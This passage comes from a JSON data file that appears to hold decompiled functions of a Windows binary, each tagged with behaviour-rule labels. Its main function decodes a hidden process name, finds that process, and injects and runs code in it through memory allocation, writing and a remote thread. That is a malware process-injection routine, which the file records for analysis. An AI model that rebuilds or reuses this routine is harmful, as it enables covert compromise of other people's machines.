*(&fcn.14000391d::var_18h + iVar5) = 0x1400080c1;\n    fcn.1400aa2e0(&stack0x00002948 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080d0;\n    fcn.1400aa2e0(&stack0x00002968 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080df;\n    fcn.1400aa2e0(&stack0x00002988 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080ee;\n    fcn.1400aa2e0(&stack0x000029a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400080fd;\n    fcn.1400aa2e0(&stack0x000029c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000810c;\n    fcn.1400aa2e0(&stack0x000029e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000811b;\n    fcn.1400aa2e0(&stack0x00002a08 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000812a;\n    fcn.1400aa2e0(&stack0x00002a28 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008139;\n    fcn.1400aa2e0(&stack0x00002a48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008148;\n    fcn.1400aa2e0(&stack0x00002a68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008157;\n    fcn.1400aa2e0(&stack0x00002a88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008166;\n    fcn.140072290(&stack0x00002ab7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000817c;\n    fcn.1400a9730(&stack0x00002ab8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fa0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400081b8;\n    uVar3 = fcn.1400015bd(&stack0x00002ab8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400081cd;\n    fcn.1400aa2e0(&stack0x00002ab8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400081f5;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000820a;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&stack0x00000234 + iVar5) = 0;\n    *(&stack0x00000228 + iVar5) = 0;\n    *(&stack0x00000220 + iVar5) = 0;\n    *(&stack0x00000218 + iVar5) = 0;\n    *(&stack0x00000208 + iVar5) = *0x140106428;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008252;\n    fcn.140001899(0x1400be020);\n    *(&stack0x000000d8 + iVar5) = 0x130;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008268;\n    uVar6 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2, 0);\n    *(&stack0x00002f50 + iVar5) = uVar6;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140008282;\n    iVar4 = sub.KERNEL32.dll_Process32First(*(&stack0x00002f50 + iVar5), &stack0x000000d8 + iVar5);\n    if (iVar4 != 1) {\ncode_r0x000140008df6:\n        *(&fcn.14000391d::var_18h + iVar5) = 0x140008e09;\n        (**0x140136088)(*(&stack0x00002f50 + iVar5));\n        bVar2 = true;\ncode_r0x000140008e0e:\n        *(&fcn.14000391d::var_18h + iVar5) = 0x140008e1d;\n        fcn.1400aa2e0(&stack0x00000238 + iVar5);\n        if (bVar2) {\n            unaff_EBX = 0;\n        }\n        return unaff_EBX;\n    }\ncode_r0x000140008dd5:\n    do {\n        *(&fcn.14000391d::var_18h + iVar5) = 0x140008de8;\n        iVar4 = sub.KERNEL32.dll_Process32Next(*(&stack0x00002f50 + iVar5), &stack0x000000d8 + iVar5);\n        if (iVar4 != 1) goto code_r0x000140008df6;\n        *(&fcn.14000391d::var_18h + iVar5) = 0x1400082ab;\n        fcn.140001a4e(&stack0x00002ad9 + iVar5, &stack0x00002ae6 + iVar5);\n        *(&stack0x00002f40 + iVar5) = &stack0x00002ad9 + iVar5;\n        *(&stack0x00002f38 + iVar5) = *(&stack0x00002f40 + iVar5);\n        if (*(*(&stack0x00002f38 + iVar5) + 0xc) != '\\0') {\n            *(&stack0x00002f30 + iVar5) = *(&stack0x00002f40 + iVar5);\n            *(&stack0x00002f28 + iVar5) = *(&stack0x00002f40 + iVar5);\n            *(&stack0x00002f24 + iVar5) = 0;\n            while (*(&stack0x00002f24 + iVar5) < 0xd) {\n                *(*(&stack0x00002f30 + iVar5) + *(&stack0x00002f24 + iVar5)) =\n                     *(*(&stack0x00002f28 + iVar5) + *(&stack0x00002f24 + iVar5)) ^\n                     *(&stack0x00002f24 + iVar5) + (*(&stack0x00002f24 + iVar5) / 0x36) * -0x36 + 0x34U;\n                *(&stack0x00002f24 + iVar5) = *(&stack0x00002f24 + iVar5) + 1;\n            }\n        }\n        *(&fcn.14000391d::var_18h + iVar5) = 0x140008387;\n        iVar4 = sub.msvcrt.dll__stricmp(&stack0x00000104 + iVar5, &stack0x00002ad9 + iVar5);\n        if (iVar4 == 0) {\n            *(&stack0x00000098 + iVar5) = 0x30;\n            *(&stack0x000000a0 + iVar5) = 0;\n            *(&stack0x000000b0 + iVar5) = 0;\n            *(&stack0x000000a8 + iVar5) = 0;\n            *(&stack0x000000b8 + iVar5) = 0;\n            *(&stack0x000000c0 + iVar5) = 0;\n            *(&stack0x000000d0 + iVar5) = 0;\n            *(&fcn.14000391d::var_18h + iVar5) = 0x1400083d4;\n            uVar6 = fcn.140001584(*(&stack0x000000e0 + iVar5));\n            *(&stack0x000000c8 + iVar5) = uVar6;\n            puVar9 = &stack0x000000c8 + iVar5;\n            arg3 = &stack0x00000098 + iVar5;\n            *(&fcn.14000391d::var_18h + iVar5) = 0x1400083ff;\n            uVar3 = (**0x140136090)(&stack0x00000218 + iVar5, 0x1fffff);\n            *(&stack0x00002f4c + iVar5) = uVar3;\n            if (*(&stack0x00002f4c + iVar5) == 0) {\n                *(&fcn.14000391d::var_18h + iVar5) = 0x1400084bc;\n                fcn.140001ce2(&stack0x00002b38 + iVar5, &stack0x00002b37 + iVar5);\n                *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002b38 + iVar5);\n                *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002b40 + iVar5);\n                *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002b48 + iVar5);\n                *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002b50 + iVar5);\n                *puVar1 = *(&stack0x00002b58 + iVar5);\n                *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002b60 + iVar5);\n                uVar6 = *(&stack0x00002b6b + iVar5);\n                *(&fcn.14000391d::arg_78h + iVar5 + 3) = *(&stack0x00002b63 + iVar5);\n                *(&stack0x0000007b + iVar5) = uVar6;\n                *(&fcn.14000391d::var_18h + iVar5) = 0x140008520;\n                fcn.14001ec70(&fcn.14000391d::arg_50h + iVar5, uVar6, arg3, puVar9);\n                puVar9 = &stack0x00000208 + iVar5;\n                *(&stack0x00000010 + iVar5) = 4;\n                *(&stack0x00000008 + iVar5) = 0x3000;\n                uVar6 = 0;\n                *(&fcn.14000391d::var_18h + iVar5) = 0x14000855b;\n                uVar3 = (**0x140136048)(*(&stack0x00000218 + iVar5), &stack0x00000228 + iVar5);\n                *(&stack0x00002f4c + iVar5) = uVar3;\n                if (*(&stack0x00002f4c + iVar5) == 0) {\n                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008624;\n                    fcn.14000215e(&stack0x00002bd8 + iVar5, &stack0x00002bd7 + iVar5);\n                    *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002bd8 + iVar5);\n                    *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002be0 + iVar5);\n                    *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002be8 + iVar5);\n                    *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002bf0 + iVar5);\n                    *puVar1 = *(&stack0x00002bf8 + iVar5);\n                    *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002c00 + iVar5);\n                    *(&stack0x00000078 + iVar5) = *(&stack0x00002c08 + iVar5);\n                    *(&stack0x00000080 + iVar5) = *(&stack0x00002c10 + iVar5);\n                    *(&stack0x00000081 + iVar5) = *(&stack0x00002c11 + iVar5);\n                    *(&stack0x00000089 + iVar5) = *(&stack0x00002c19 + iVar5);\n                    *(&fcn.14000391d::var_18h + iVar5) = 0x14000869e;\n                    fcn.14001ef20(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002c19 + iVar5), uVar6, puVar9);\n                    *(&stack0x00000008 + iVar5) = &stack0x00000210 + iVar5;\n                    *(&fcn.14000391d::var_18h + iVar5) = 0x1400086d3;\n                    uVar6 = *0x140136040;\n                    uVar8 = *0x140106428;\n                    uVar3 = (**0x140136050)(*(&stack0x00000218 + iVar5), *(&stack0x00000228 + iVar5));\n                    *(&stack0x00002f4c + iVar5) = uVar3;\n                    if (*(&stack0x00002f4c + iVar5) == 0) {\n                        *(&fcn.14000391d::var_18h + iVar5) = 0x14000879c;\n                        fcn.14000261a(&stack0x00002c78 + iVar5, &stack0x00002c77 + iVar5);\n                        *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002c78 + iVar5);\n                        *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002c80 + iVar5);\n                        *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002c88 + iVar5);\n                        *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002c90 + iVar5);\n                        *puVar1 = *(&stack0x00002c98 + iVar5);\n                        *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002ca0 + iVar5);\n                        *(&stack0x00000078 + iVar5) = *(&stack0x00002ca8 + iVar5);\n                        *(&stack0x00000080 + iVar5) = *(&stack0x00002cb0 + iVar5);\n                        *(&stack0x00000084 + iVar5) = *(&stack0x00002cb4 + iVar5);\n                        *(&stack0x0000008c + iVar5) = *(&stack0x00002cbc + iVar5);\n                        *(&fcn.14000391d::var_18h + iVar5) = 0x140008816;\n                        fcn.14001f0f0(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002cbc + iVar5), uVar6, uVar8);\n                        *(&stack0x00000008 + iVar5) = &stack0x00000234 + iVar5;\n                        uVar8 = 1;\n                        uVar6 = 0x140106428;\n                        *(&fcn.14000391d::var_18h + iVar5) = 0x14000884a;\n                        uVar3 = (**0x140136058)(*(&stack0x00000218 + iVar5), &stack0x00000228 + iVar5);\n                        *(&stack0x00002f4c + iVar5) = uVar3;\n                        if (*(&stack0x00002f4c + iVar5) == 0) {\n                            *(&fcn.14000391d::var_18h + iVar5) = 0x1400088ec;\n                            fcn.140002a36(&stack0x00002d08 + iVar5, &stack0x00002d07 + iVar5);\n                            *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002d08 + iVar5);\n                            *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002d10 + iVar5);\n                            *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002d18 + iVar5);\n                            *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002d20 + iVar5);\n                            uVar7 = *(&stack0x00002d30 + iVar5);\n                            *puVar1 = *(&stack0x00002d28 + iVar5);\n                            *(&fcn.14000391d::arg_78h + iVar5) = uVar7;\n                            *(&fcn.14000391d::arg_78h + iVar5 + 7) = *(&stack0x00002d37 + iVar5);\n                            *(&fcn.14000391d::var_18h + iVar5) = 0x140008945;\n                            fcn.14001eab0(&fcn.14000391d::arg_50h + iVar5, uVar7, uVar6, uVar8);\n                            uVar6 = *(&stack0x00000218 + iVar5);\n                            *(&fcn.14000391d::arg_40h + iVar5) = 0;\n                            *(&fcn.14000391d::arg_38h + iVar5) = 0;\n                            *(&fcn.14000391d::arg_30h + iVar5) = 0;\n                            *(&stack0x00000020 + iVar5) = 0;\n                            *(&stack0x00000018 + iVar5) = 1;\n                            *(&stack0x00000010 + iVar5) = 0;\n                            *(&stack0x00000008 + iVar5) = *(&stack0x00000228 + iVar5);\n                            uVar8 = 0;\n                            *(&fcn.14000391d::var_18h + iVar5) = 0x1400089af;\n                            uVar3 = (**0x140136060)(&stack0x00000220 + iVar5, 0x20000000);\n                            *(&stack0x00002f4c + iVar5) = uVar3;\n                            if (*(&stack0x00002f4c + iVar5) == 0) {\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008a6c;\n                                fcn.140002e1a(&stack0x00002d98 + iVar5, &stack0x00002d97 + iVar5);\n                                *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002d98 + iVar5);\n                                *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002da0 + iVar5);\n                                *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002da8 + iVar5);\n                                *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002db0 + iVar5);\n                                *puVar1 = *(&stack0x00002db8 + iVar5);\n                                *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002dc0 + iVar5);\n                                *(&stack0x00000078 + iVar5) = *(&stack0x00002dc8 + iVar5);\n                                *(&stack0x00000080 + iVar5) = *(&stack0x00002dd0 + iVar5);\n                                *(&stack0x00000088 + iVar5) = *(&stack0x00002dd8 + iVar5);\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008ad9;\n                                fcn.14001ee40(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002dd0 + iVar5), uVar8, uVar6\n                                             );\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008aef;\n                                fcn.14000304c(&stack0x00002de8 + iVar5, &stack0x00002de7 + iVar5);\n                                *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002de8 + iVar5);\n                                *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002df0 + iVar5);\n                                *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002df8 + iVar5);\n                                *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002e00 + iVar5);\n                                uVar7 = *(&stack0x00002e10 + iVar5);\n                                *puVar1 = *(&stack0x00002e08 + iVar5);\n                                *(&fcn.14000391d::arg_78h + iVar5) = uVar7;\n                                *(&fcn.14000391d::arg_78h + iVar5 + 6) = *(&stack0x00002e16 + iVar5);\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008b48;\n                                fcn.14001e8e0(&fcn.14000391d::arg_50h + iVar5, uVar7, uVar8, uVar6);\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008b56;\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                                *(&stack0x00000008 + iVar5) = &stack0x00000234 + iVar5;\n                                uVar8 = 0x20;\n                                uVar6 = 0x140106428;\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008b8a;\n                                uVar3 = (**0x140136058)(*(&stack0x00000218 + iVar5), &stack0x00000228 + iVar5);\n                                *(&stack0x00002f4c + iVar5) = uVar3;\n                                if (*(&stack0x00002f4c + iVar5) == 0) {\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008c2c;\n                                    fcn.1400033b8(&stack0x00002e68 + iVar5, &stack0x00002e67 + iVar5);\n                                    *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002e68 + iVar5);\n                                    *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002e70 + iVar5);\n                                    *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002e78 + iVar5);\n                                    *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002e80 + iVar5);\n                                    uVar7 = *(&stack0x00002e90 + iVar5);\n                                    *puVar1 = *(&stack0x00002e88 + iVar5);\n                                    *(&fcn.14000391d::arg_78h + iVar5) = uVar7;\n                                    *(&fcn.14000391d::arg_78h + iVar5 + 7) = *(&stack0x00002e97 + iVar5);\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008c85;\n                                    fcn.14001eab0(&fcn.14000391d::arg_50h + iVar5, uVar7, uVar6, uVar8);\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008c9e;\n                                    arg3_00 = *0x140136068;\n                                    uVar3 = (**0x140136068)(*(&stack0x00000220 + iVar5), 0);\n                                    *(&stack0x00002f4c + iVar5) = uVar3;\n                                    if (*(&stack0x00002f4c + iVar5) == 0) {\n                                        *(&fcn.14000391d::var_18h + iVar5) = 0x140008d42;\n                                        fcn.140003744(&stack0x00002ee8 + iVar5, &stack0x00002ee7 + iVar5);\n                                        *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002ee8 + iVar5);\n                                        *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002ef0 + iVar5);\n                                        *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002ef8 + iVar5);\n                                        *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002f00 + iVar5);\n                                        *puVar1 = *(&stack0x00002f08 + iVar5);\n                                        *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002f10 + iVar5);\n                                        uVar6 = *(&stack0x00002f19 + iVar5);\n                                        *(&fcn.14000391d::arg_78h + iVar5 + 1) = *(&stack0x00002f11 + iVar5);\n                                        *(&stack0x00000079 + iVar5) = uVar6;\n                                        *(&fcn.14000391d::var_18h + iVar5) = 0x140008da6;\n                                        fcn.14001eb90(&fcn.14000391d::arg_50h + iVar5, uVar6, arg3_00, uVar8);\n                                        *(&fcn.14000391d::var_18h + iVar5) = 0x140008db9;\n                                        (**0x140136088)(*(&stack0x00000218 + iVar5));\n                                        *(&fcn.14000391d::var_18h + iVar5) = 0x140008dcc;\n                                        (**0x140136088)(*(&stack0x00000220 + iVar5));\n                                        goto code_r0x000140008dd5;\n                                    }\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008cc3;\n                                    fcn.140003582(&stack0x00002ea8 + iVar5, &stack0x00002ea7 + iVar5);\n                                    *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002ea8 + iVar5);\n                                    *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002eb0 + iVar5);\n                                    *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002eb8 + iVar5);\n                                    *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002ec0 + iVar5);\n                                    *puVar1 = *(&stack0x00002ec8 + iVar5);\n                                    *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002ed0 + iVar5);\n                                    *(&fcn.14000391d::arg_78h + iVar5 + 6) = *(&stack0x00002ed6 + iVar5);\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008d22;\n                                    fcn.14001e9c0(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), arg3_00\n                                                  , uVar8);\n                                }\n                                else {\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008baf;\n                                    fcn.14000320e(&stack0x00002e28 + iVar5, &stack0x00002e27 + iVar5);\n                                    *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002e28 + iVar5);\n                                    *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002e30 + iVar5);\n                                    *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002e38 + iVar5);\n                                    *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002e40 + iVar5);\n                                    *puVar1 = *(&stack0x00002e48 + iVar5);\n                                    *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002e50 + iVar5);\n                                    *(&fcn.14000391d::arg_78h + iVar5 + 7) = *(&stack0x00002e57 + iVar5);\n                                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008c0c;\n                                    fcn.14001e7f0(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), uVar6, \n                                                  uVar8);\n                                }\n                            }\n                            else {\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x1400089d8;\n                                fcn.140002c00(&stack0x00002d48 + iVar5, &stack0x00002d47 + iVar5);\n                                *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002d48 + iVar5);\n                                *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002d50 + iVar5);\n                                *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002d58 + iVar5);\n                                *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002d60 + iVar5);\n                                *puVar1 = *(&stack0x00002d68 + iVar5);\n                                *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002d70 + iVar5);\n                                *(&stack0x00000078 + iVar5) = *(&stack0x00002d78 + iVar5);\n                                *(&stack0x00000080 + iVar5) = *(&stack0x00002d80 + iVar5);\n                                (&stack0x00000088)[iVar5] = (&stack0x00002d88)[iVar5];\n                                *(&fcn.14000391d::var_18h + iVar5) = 0x140008a4c;\n                                fcn.14001ed50(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), uVar8, uVar6\n                                             );\n                            }\n                        }\n                        else {\n                            *(&fcn.14000391d::var_18h + iVar5) = 0x14000886f;\n                            fcn.14000288c(&stack0x00002cc8 + iVar5, &stack0x00002cc7 + iVar5);\n                            *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002cc8 + iVar5);\n                            *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002cd0 + iVar5);\n                            *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002cd8 + iVar5);\n                            *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002ce0 + iVar5);\n                            *puVar1 = *(&stack0x00002ce8 + iVar5);\n                            *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002cf0 + iVar5);\n                            *(&fcn.14000391d::arg_78h + iVar5 + 7) = *(&stack0x00002cf7 + iVar5);\n                            *(&fcn.14000391d::var_18h + iVar5) = 0x1400088cc;\n                            fcn.14001e7f0(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), uVar6, uVar8);\n                        }\n                    }\n                    else {\n                        *(&fcn.14000391d::var_18h + iVar5) = 0x1400086fc;\n                        fcn.1400023b8(&stack0x00002c28 + iVar5, &stack0x00002c27 + iVar5);\n                        *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002c28 + iVar5);\n                        *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002c30 + iVar5);\n                        *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002c38 + iVar5);\n                        *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002c40 + iVar5);\n                        *puVar1 = *(&stack0x00002c48 + iVar5);\n                        *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002c50 + iVar5);\n                        *(&stack0x00000078 + iVar5) = *(&stack0x00002c58 + iVar5);\n                        *(&stack0x00000080 + iVar5) = *(&stack0x00002c60 + iVar5);\n                        *(&stack0x00000082 + iVar5) = *(&stack0x00002c62 + iVar5);\n                        *(&stack0x0000008a + iVar5) = *(&stack0x00002c6a + iVar5);\n                        *(&fcn.14000391d::var_18h + iVar5) = 0x14000877c;\n                        fcn.14001f000(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), uVar6, uVar8);\n                    }\n                }\n                else {\n                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008584;\n                    fcn.140001ecc(&stack0x00002b78 + iVar5, &stack0x00002b77 + iVar5);\n                    *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002b78 + iVar5);\n                    *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002b80 + iVar5);\n                    *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002b88 + iVar5);\n                    *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002b90 + iVar5);\n                    *puVar1 = *(&stack0x00002b98 + iVar5);\n                    *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002ba0 + iVar5);\n                    *(&stack0x00000078 + iVar5) = *(&stack0x00002ba8 + iVar5);\n                    *(&stack0x00000080 + iVar5) = *(&stack0x00002bb0 + iVar5);\n                    *(&stack0x00000088 + iVar5) = *(&stack0x00002bb8 + iVar5);\n                    *(&stack0x00000090 + iVar5) = *(&stack0x00002bc0 + iVar5);\n                    *(&fcn.14000391d::var_18h + iVar5) = 0x140008604;\n                    fcn.14001f1d0(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), uVar6, puVar9);\n                }\n            }\n            else {\n                *(&fcn.14000391d::var_18h + iVar5) = 0x140008428;\n                fcn.140001ac8(&stack0x00002ae8 + iVar5, &stack0x00002ae7 + iVar5);\n                *(&fcn.14000391d::arg_50h + iVar5) = *(&stack0x00002ae8 + iVar5);\n                *(&fcn.14000391d::arg_58h + iVar5) = *(&stack0x00002af0 + iVar5);\n                *(&fcn.14000391d::arg_60h + iVar5) = *(&stack0x00002af8 + iVar5);\n                *(&fcn.14000391d::arg_68h + iVar5) = *(&stack0x00002b00 + iVar5);\n                *puVar1 = *(&stack0x00002b08 + iVar5);\n                *(&fcn.14000391d::arg_78h + iVar5) = *(&stack0x00002b10 + iVar5);\n                *(&stack0x00000078 + iVar5) = *(&stack0x00002b18 + iVar5);\n                *(&stack0x00000080 + iVar5) = *(&stack0x00002b20 + iVar5);\n                (&stack0x00000088)[iVar5] = (&stack0x00002b28)[iVar5];\n                *(&fcn.14000391d::var_18h + iVar5) = 0x14000849c;\n                fcn.14001ed50(&fcn.14000391d::arg_50h + iVar5, *(&stack0x00002f4c + iVar5), arg3, puVar9);\n            }\n            unaff_EBX = 0;\n            bVar2 = false;\n            goto code_r0x000140008e0e;\n        }\n    } while( true );\n}\n",
        "token_count": 67334
    },
    "14000a5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14000a5f2(ulong arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    if ((arg1 == 1) && (arg2 == 0xffff)) {\n        fcn.1400b2a60(0x1401360d0);\n        fcn.1400014f0(fcn.14000a5d4);\n        *0x140136040 = sub.msvcrt.dll_malloc(*0x140106428);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "14000a89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000a890(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    \n    if (arg2 == 0) {\n        pcVar1 = *(arg1 + 0x18);\n        if (*pcVar1 == '\\0') {\n            return 0;\n        }\n        *(arg1 + 0x18) = pcVar1 + 1;\n        arg2._0_4_ = *pcVar1;\n    }\n    if (arg2 != 0x68) {\n        if (arg2 != 0x76) {\n            return 0;\n        }\n        fcn.14000a7d0(arg1);\n        if (**(arg1 + 0x18) != '_') {\n            return 0;\n        }\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    fcn.14000a7d0(arg1);\n    if (**(arg1 + 0x18) != '_') {\n        return 0;\n    }\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    return 1;\n}\n",
        "token_count": 263
    },
    "14000a9f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14000a9f0(int64_t arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    int32_t *arg2_00;\n    \n    if (arg2 != NULL) {\n        do {\n            if (1 < arg2[2]) {\n                return;\n            }\n            iVar1 = *(arg1 + 0x134);\n            if (0x400 < iVar1) {\n                return;\n            }\n            arg2[2] = arg2[2] + 1;\n    // switch table (82 cases) at 0x14010c164\n            switch(*arg2) {\n            default:\n                goto code_r0x00014000aa41;\n            case 4:\n                *(arg1 + 0x16c) = *(arg1 + 0x16c) + 1;\n            case 1:\n            case 2:\n            case 3:\n            case 9:\n            case 10:\n            case 0xb:\n            case 0xc:\n            case 0xd:\n            case 0xe:\n            case 0xf:\n            case 0x10:\n            case 0x11:\n            case 0x12:\n            case 0x13:\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\n            case 0x19:\n            case 0x1a:\n            case 0x1b:\n            case 0x1c:\n            case 0x1d:\n            case 0x1e:\n            case 0x1f:\n            case 0x20:\n            case 0x21:\n            case 0x22:\n            case 0x25:\n            case 0x26:\n            case 0x28:\n            case 0x29:\n            case 0x2a:\n            case 0x2b:\n            case 0x2d:\n            case 0x2e:\n            case 0x2f:\n            case 0x30:\n            case 0x31:\n            case 0x34:\n            case 0x35:\n            case 0x36:\n            case 0x37:\n            case 0x38:\n            case 0x39:\n            case 0x3a:\n            case 0x3b:\n            case 0x3c:\n            case 0x3d:\n            case 0x3e:\n            case 0x3f:\n            case 0x40:\n            case 0x41:\n            case 0x44:\n            case 